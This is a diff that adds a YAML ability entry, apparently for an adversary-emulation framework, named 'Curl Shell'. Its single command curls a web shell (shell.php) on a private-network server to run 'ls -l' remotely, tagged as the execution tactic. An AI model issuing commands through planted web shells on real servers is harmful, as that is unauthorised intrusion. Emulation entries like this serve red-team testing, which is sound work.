@@ -1,0 +1,15 @@
+- requirements: []
+  name: Curl Shell
+  description: Executes a command via a web shell in the server at the specified ip
+  tactic: execution
+  technique_id: TB006
+  technique_name: Indirect Command Execution
+  executors:
+  - cleanup: []
+    timeout: 120
+    platform: linux
+    name: sh
+    payloads: []
+    parsers: []
+    command: sleep 90; curl http://192.168.3.10/shell.php?cmd=ls%20-l
+  id: a1ab2a64-28d0-4b56-b7ce-4069c251275c
